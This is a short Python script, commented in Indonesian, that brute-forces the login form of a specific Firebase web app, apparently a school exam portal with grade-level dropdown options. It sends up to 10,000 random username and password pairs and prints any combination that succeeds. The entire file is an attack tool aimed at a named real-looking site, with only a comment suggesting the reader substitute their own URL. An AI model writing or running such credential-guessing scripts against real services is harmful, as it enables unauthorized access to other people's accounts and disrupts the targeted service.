import random
import string
import requests

# Konfigurasi Firebase dan Form Login
URL = "https://pas2024.web.app/login"  # Ganti dengan URL Firebase login Anda
DROPDOWN_OPTIONS = ["X (SEPULUH)", "XI (SEBELAS)", "XII (DUA BELAS)"]  # Pilihan dropdown pada form
MAX_ATTEMPTS = 10000  # Batas percobaan brute force

# Fungsi untuk meng-generate username dan password acak
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Fungsi untuk mengirim permintaan login
def attempt_login(url, username, password, dropdown):
    data = {
        "username": username,
        "password": password,
        "dropdown": dropdown,
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            # Cek apakah respons menunjukkan login berhasil
            if "success" in response.text.lower():  # Sesuaikan dengan respons login Anda
                return True, response.text
        return False, response.text
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        return False, None

# Main Brute Force Loop
def brute_force_login():
    for attempt in range(1, MAX_ATTEMPTS + 1):
        username = generate_random_string()
        password = generate_random_string()
        dropdown = random.choice(DROPDOWN_OPTIONS)
        print(f"[Attempt {attempt}] Trying username: {username}, password: {password}, dropdown: {dropdown}")

        success, response = attempt_login(URL, username, password, dropdown)
        if success:
            print("[+] Login Successful!")
            print(f"Username: {username}, Password: {password}, Dropdown: {dropdown}")
            print(f"Response: {response}")
            break
    else:
        print("[-] Brute force test completed. No successful attempts.")

if __name__ == "__main__":
    brute_force_login()
